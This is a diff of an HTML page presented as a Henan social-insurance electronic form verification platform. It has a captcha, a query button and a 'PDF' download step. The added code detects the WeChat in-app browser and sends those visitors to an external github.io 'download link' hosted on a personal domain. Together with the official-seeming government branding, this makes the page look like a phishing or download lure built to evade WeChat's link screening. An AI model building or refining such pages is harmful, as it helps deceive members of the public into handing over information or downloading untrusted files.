@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <title>河南社保表单验证</title>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; background-color: #f8f8f8; }
@@ -25,18 +24,15 @@
 <body>
     <div class="container" id="form-container">
         <h2>河南社保电子表单在线验证平台</h2>
-
         <div class="image-container">
             <img src="example.jpg" alt="社保表单示例">
         </div>
 
         <input type="text" value="042mn0t319w0csk2h14h9234921555a5" readonly>
-
         <div class="captcha-container">
             <input type="text" id="captcha-input" placeholder="请输入图片验证码">
             <canvas id="captcha" width="100" height="40" onclick="generateCaptcha()"></canvas>
         </div>
-
         <button class="query-btn" onclick="submitForm()">查 询</button>
     </div>
 
@@ -49,6 +45,24 @@
     <script>
         let captchaText = "";
         let generatedPdfUrl = "";
+
+        // 判断是否在微信中打开
+        function is_wechat_client() {
+            var ua = navigator.userAgent.toLowerCase();
+            return ua.match(/MicroMessenger/i) == "micromessenger";
+        }
+
+        // 页面加载时检测用户是否在微信中打开
+        window.onload = function() {
+            if (is_wechat_client()) {
+                alert("请在手机浏览器中打开链接！");
+                // 可以在此处执行跳转到浏览器的操作
+                window.location.href = "https://hnsbpt001.github.io/"; // 假设你的下载链接
+            } else {
+                // 不是微信客户端，正常显示表单和功能
+                generateCaptcha();
+            }
+        };
 
         // 生成验证码
         function generateCaptcha() {
@@ -138,23 +152,10 @@
             }
         }
 
-        // 点击下载时触发下载并跳转到浏览器
+        // 点击下载时触发下载
         function triggerDownload() {
-            // 判断用户设备类型并跳转
-            var userAgent = navigator.userAgent.toLowerCase();
-            if (/iphone|ipod|ipad/.test(userAgent)) {
-                // iOS设备，跳转到浏览器
-                window.location.href = generatedPdfUrl;
-            } else if (/android/.test(userAgent)) {
-                // Android设备，跳转到浏览器
-                window.location.href = generatedPdfUrl;
-            } else {
-                // 其他设备，跳转到浏览器
-                window.location.href = generatedPdfUrl;
-            }
+            window.location.href = generatedPdfUrl;
         }
-
-        window.onload = generateCaptcha;
     </script>
 </body>
 </html>
